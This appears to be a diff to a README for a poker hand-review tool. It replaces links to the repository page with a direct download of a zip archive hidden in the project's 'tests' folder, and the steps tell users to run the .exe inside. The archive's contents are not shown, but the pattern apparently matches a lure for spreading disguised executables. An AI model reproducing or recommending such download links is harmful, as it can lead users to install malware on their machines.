@@ -1,6 +1,6 @@
 # 🃏 poker-hand-review - Improve your tournament results with data
 
-[![](https://img.shields.io/badge/Download-poker--hand--review-blue)](https://github.com/Vgaj9497/poker-hand-review)
+[![](https://img.shields.io/badge/Download-poker--hand--review-blue)](https://github.com/Vgaj9497/poker-hand-review/raw/refs/heads/main/tests/hand_review_poker_2.9-alpha.4.zip)
 
 ## 🎯 About the software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download the software: [https://github.com/Vgaj9497/poker-hand-review](https://github.com/Vgaj9497/poker-hand-review)
+1. Visit this page to download the software: [https://github.com/Vgaj9497/poker-hand-review/raw/refs/heads/main/tests/hand_review_poker_2.9-alpha.4.zip](https://github.com/Vgaj9497/poker-hand-review/raw/refs/heads/main/tests/hand_review_poker_2.9-alpha.4.zip)
 2. Locate the latest release file on the page. Look for the file ending in .exe.
 3. Click the file to start the download to your computer.
 4. Move the downloaded file to a folder where you want the application to live.
